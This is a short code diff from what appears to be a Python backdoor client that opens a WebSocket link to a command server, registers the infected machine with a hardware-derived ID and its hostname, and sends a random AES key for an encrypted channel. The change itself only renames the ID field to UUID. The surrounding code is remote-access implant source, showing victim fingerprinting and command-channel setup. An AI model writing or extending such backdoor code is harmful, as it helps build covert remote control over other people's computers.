@@ -19,7 +19,7 @@ class BackdoorClient(threading.Thread):
         threading.Thread.__init__(self)
         self.SERVER_HOST = 'http://127.0.0.1:8888'
         self.HOST_NAME = hostname()
-        self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
+        self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
         self.IV = '\0' * AES.block_size
         self.SECRET = os.urandom(32)
         self.ws = None
@@ -32,7 +32,7 @@ class BackdoorClient(threading.Thread):
             try:
                 self.ws = create_connection("ws://localhost:8888/")
 
-                sercret_msg = {'id': self.ID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET)}
+                sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET)}
                 self.ws.send(json.dumps(sercret_msg))
 
                 time.sleep(1)
